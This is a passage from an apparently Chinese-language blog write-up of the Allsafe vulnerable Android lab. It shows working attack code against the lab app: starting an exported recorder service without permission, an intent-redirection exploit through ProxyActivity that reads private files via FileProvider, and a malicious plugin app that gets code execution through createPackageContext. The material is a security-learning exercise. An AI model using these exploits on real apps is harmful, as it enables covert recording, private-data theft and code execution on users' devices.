-&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">10</span>; i&gt;<span class="number">0</span>; i--)&#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;run: &quot;</span>+ i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            stopSelf();</span><br><span class="line">        &#125;).start();</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;onStartCommand Done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> START_STICKY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//销毁时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;onDestroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外还需要在AndroidManifest.xml文件注册，这是Android四大组件共有的特点：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyService&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果exported设置为true的话，外部其他应用也可以使用这个Service，但对方应用需要在AndroidManifest.xml进行声明，在manifest标签中添加：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.demo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<p>显式启停服务的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        findViewById(R.id.start_button).setOnClickListener(v -&gt; &#123;</span><br><span class="line">            startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(getBaseContext(), MyService.class));</span><br><span class="line">        &#125;);</span><br><span class="line">        findViewById(R.id.stop_button).setOnClickListener(v -&gt; &#123;</span><br><span class="line">            stopService(<span class="keyword">new</span> <span class="title class_">Intent</span>(getBaseContext(), MyService.class));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当通过<code>startService()</code>方法显式启动一个服务后，即使关闭了启动该服务的应用程序（比如用户按下 “返回” 键或者通过任务管理器关闭应用），服务通常会继续运行，除非被明确停止（调用<code>stopService()</code>方法或者在服务内部调用<code>stopSelf()</code>方法）。</p>
<p><code>startService()</code>启动服务后，调用者（Activity）就和 Service 没有关联了，那如何在Activity中控制服务内的行为和获取一些数据呢，可以通过<code>bindService()</code> 方法绑定开启服务，示例Service代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">isDownloading</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">progress</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">DownloadBinder</span> <span class="variable">downloadBinder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DownloadBinder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadBinder</span> <span class="keyword">extends</span> <span class="title class_">Binder</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(isDownloading)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            isDownloading = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">100</span> &amp;&amp; isDownloading; i+=<span class="number">10</span>)&#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">&quot;run: &quot;</span>+ i);</span><br><span class="line">                    progress = i;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                isDownloading = <span class="literal">false</span>;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span>&#123;</span><br><span class="line">            isDownloading = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getProgress</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> progress;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;onBind&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> downloadBinder;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在AndroidManifest.xml中注册：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.DownloadService&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>Activity中代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DownloadService.DownloadBinder downloadBinder;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ServiceConnection</span> <span class="variable">serviceConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">            downloadBinder = (DownloadService.DownloadBinder) service;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        bindService(<span class="keyword">new</span> <span class="title class_">Intent</span>(getBaseContext(), DownloadService.class),serviceConnection,BIND_AUTO_CREATE);</span><br><span class="line"></span><br><span class="line">        findViewById(R.id.start_button).setOnClickListener(v -&gt; &#123;</span><br><span class="line">            downloadBinder.start();</span><br><span class="line">        &#125;);</span><br><span class="line">        findViewById(R.id.stop_button).setOnClickListener(v -&gt; &#123;</span><br><span class="line">            downloadBinder.stop();</span><br><span class="line">        &#125;);</span><br><span class="line">        findViewById(R.id.get_button).setOnClickListener(v -&gt; &#123;</span><br><span class="line">            Log.d(TAG,<span class="string">&quot;progress: &quot;</span>+downloadBinder.getProgress());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        unbindService(serviceConnection);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>参考官方文档 <a target="_blank" rel="noopener" href="https://developer.android.com/develop/background-work/services#LifecycleCallbacks">https://developer.android.com/develop/background-work/services?#LifecycleCallbacks</a> ，生命周期如下：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/service_lifecycle.png" class="" title="img">

<h4 id="Service风险"><a href="#Service风险" class="headerlink" title="Service风险"></a>Service风险</h4><p>Service风险主要是设置为对外导出的同时，代码实现逻辑又有问题导致的权限提升，消息伪造，拒绝服务等。</p>
<p>来看靶场APK：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223172534925.png" class="" title="image-20241223172534925">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223175415785.png" class="" title="image-20241223175415785">

<p>声明了一个导出Service，Service中进行了录音，如果该应用申请到了录音权限。那我们的应用不需要录音权限也可以通过这个Service去录音，攻击代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;infosecadventures.allsafe&quot;</span>,<span class="string">&quot;infosecadventures.allsafe.challenges.RecorderService&quot;</span>));</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>

<p>另外还需要在AndroidManifest.xml声明权限：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">&quot;infosecadventures.allsafe&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>但以上攻击代码在Android 8.0以上可能会出现如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android.app.BackgroundServiceStartNotAllowedException: Not allowed to start service Intent &#123; cmp=infosecadventures.allsafe/.challenges.RecorderService &#125;: app is in background uid UidRecord&#123;1652d u0a141 LAST bg:+5m38s65ms idle change:cached|procstate procs:0 seq(60632,60325)&#125; caps=------</span><br><span class="line">	at android.app.ContextImpl.startServiceCommon(ContextImpl.java:1945)</span><br></pre></td></tr></table></figure>

<p>原因见 <a target="_blank" rel="noopener" href="https://developer.android.com/about/versions/oreo/background#services">https://developer.android.com/about/versions/oreo/background#services</a> </p>
<p>可以改为如下服务启动方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startForegroundService(intent);</span><br></pre></td></tr></table></figure>



<p>实际案例可参考：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269255.htm">https://bbs.kanxue.com/thread-269255.htm</a></p>
<h3 id="Insecure-Providers"><a href="#Insecure-Providers" class="headerlink" title="Insecure Providers"></a>Insecure Providers</h3><blockquote>
<p>We got a report that our notes database leaked through an insecure content provider. Fortunately, the dev team said it’s easy to secure Android inter process communication. The app also provides access to some files which we share with other apps…</p>
<p>Can you check if the implementation is good enough? Allsafe can’t afford another sensitive file leak.</p>
</blockquote>
<p>看靶场APK中这两个Provider：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234501192.png" class="" title="image-20241223234501192">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234900620.png" class="" title="image-20241223234900620">

<p>其中DataProvider是导出的，直接可供外部应用查询，可以用adb查询：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query --uri &quot;content://infosecadventures.allsafe.dataprovider&quot;</span><br></pre></td></tr></table></figure>



<p>FileProvider是非导出的，但是设置了<code>android:grantUriPermissions=&quot;true&quot;</code>，具体说明可参考官方文档： <a target="_blank" rel="noopener" href="https://developer.android.com/guide/topics/manifest/provider-element#gprmsn">https://developer.android.com/guide/topics/manifest/provider-element?#gprmsn</a> ，这个属性大概就是设置是否可以向无权访问Content Provider的组件授予临时权限，用法就是在启动组件的Intent中设置<code>FLAG_GRANT_READ_URI_PERMISSION</code>和要授权的URI。</p>
<p>FileProvider的meta-data中设置了可访问路径为：<code>/data/data/&lt;package name&gt;/files</code></p>
<p>再继续看APK中有个导出的ProxyActivity，会使用外部传入的Intent去启动任意其他Activity：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234104101.png" class="" title="image-20241223234104101">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241223234211993.png" class="" title="image-20241223234211993">



<p>那么攻击者可以构造一个设置<code>FLAG_GRANT_READ_URI_PERMISSION</code>的Intent，然后传入ProxyActivity，ProxyActivity打开攻击者的Activity，这时攻击者的Activity就有了Content Provider的临时权限，就能读取文件了，读取<code>/data/data/infosecadventures.allsafe/files</code>文件的攻击代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_read);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getContentResolver().openInputStream(getIntent().getData());</span><br><span class="line">            Log.d(TAG,<span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.ReadActivity&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">extraIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        extraIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br><span class="line">        extraIntent.setData(Uri.parse(<span class="string">&quot;content://infosecadventures.allsafe.fileprovider/files/test.txt&quot;</span>));</span><br><span class="line">        extraIntent.setClass(<span class="built_in">this</span>,ReadActivity.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;infosecadventures.allsafe&quot;</span>,<span class="string">&quot;infosecadventures.allsafe.ProxyActivity&quot;</span>));</span><br><span class="line">        intent.putExtra(<span class="string">&quot;extra_intent&quot;</span>,extraIntent);</span><br><span class="line"></span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Arbitrary-Code-Execution"><a href="#Arbitrary-Code-Execution" class="headerlink" title="Arbitrary Code Execution"></a>Arbitrary Code Execution</h3><blockquote>
<p>There are 2 ways to execute arbirary code in this application and they are located in a single vulnerable class.</p>
<p>The first option is to launch code from third-party apps with no security checks. The second option is related to DEX libraries. May the code be with you!</p>
</blockquote>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224100508805.png" class="" title="image-20241224100508805">

<p><code>invokePlugins()</code>方法中通过<code>createPackageContext(packageName, Context.CONTEXT_IGNORE_SECURITY|Context.CONTEXT_INCLUDE_CODE)</code>创建了上下文，并且反射执行了其中的方法，在Android官方文档中已经阐述了可能存在恶意代码执行的风险：<a target="_blank" rel="noopener" href="https://developer.android.com/privacy-and-security/risks/create-package-context">https://developer.android.com/privacy-and-security/risks/create-package-context</a></p>
<p>创建一个包名为infosecadventures.allsafe.plugin的攻击应用，攻击代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> infosecadventures.allsafe.plugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Loader</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadPlugin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Exception&quot;</span>,e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>createPackageContext().getClassLoader()</code>加载的攻击应用中的类好像有缓存，通过卸载攻击应用再重新安装可以解决。</p>
<p>打开靶场对应界面后查看日志：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224125502502.png" class="" title="image-20241224125502502">

<p>whoami执行结果正是靶场应用的UID：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224125840520.png" class="" title="image-20241224125840520">



<p><code>invokeUpdate()</code>方法是从APK文件中加载类，但貌似文件路径有点问题，我猜作者应该是准备这样写的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">File</span>(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + <span class="string">&quot;/allsafe_updater.apk&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Native-Library"><a href="#Native-Library" class="headerlink" title="Native Library"></a>Native Library</h3><blockquote>
<p>There’s a native library compiled with the application that is used to validate the password below. By reverse engineering the library, you’ll easily find the password. However, your task here is to use Frida to hook the method in the library and bypass the password check.</p>
</blockquote>
<p>目的是使用Frida Hook Native层的so函数，查看代码：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241224134154868.png" class="" title="image-20241224134154868">

<p>使用了从native_library库中的checkPassword方法进行密码检查。</p>
<p>测试发现其实直接Hook Java层Native函数就行：</p>
